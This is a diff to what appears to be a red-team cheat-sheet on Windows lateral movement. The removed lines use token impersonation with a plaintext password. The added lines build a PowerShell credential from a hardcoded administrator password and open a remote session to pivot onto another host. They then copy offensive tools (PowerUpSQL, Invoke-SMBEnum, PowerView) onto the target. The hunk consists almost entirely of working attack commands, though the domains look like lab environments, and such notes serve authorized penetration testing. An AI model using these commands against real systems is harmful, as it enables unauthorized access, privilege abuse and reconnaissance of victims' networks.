@@ -34,10 +34,17 @@ wmic /authority:"kerberos:insomnia.io\DC01" /node:DC01.insomnia.io "cmd /c ipcon
 ```
   ### PowerShell Remoting
  ```
-ImpersonateUser CYBER\n.lamb
-MakeToken n.lamb cyberbotic.io F3rrari
-PowerShell Invoke-Command -ComputerName wkstn-4945 -ScriptBlock { hostname; whoami }
-PowerShell $pass=ConvertTo-SecureString "F3rrari" -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("cyberbotic.io\n.lamb", $pass); Invoke-Command -ComputerName wkstn-4945 -ScriptBlock { hostname; whoami } -Credential $cred
+$username = 'John\administrator'
+$password = '123456@1'
+$credential = New-Object System.Management.Automation.PSCredential -ArgumentList @($username,(ConvertTo-SecureString -String $password -AsPlainText -Force))
+
+$Pivot = New-PSSession jOHN.insomnia.local -Credential $credential
+Invoke-command -scriptblock{hostname} -Session $Pivot
+
+#To Upload to targeted 
+Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\PowerUpSQL.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 3)
+Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\Invoke-SMBEnum.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 3)
+Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\powerview-dev.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 3)
 ```
 
 
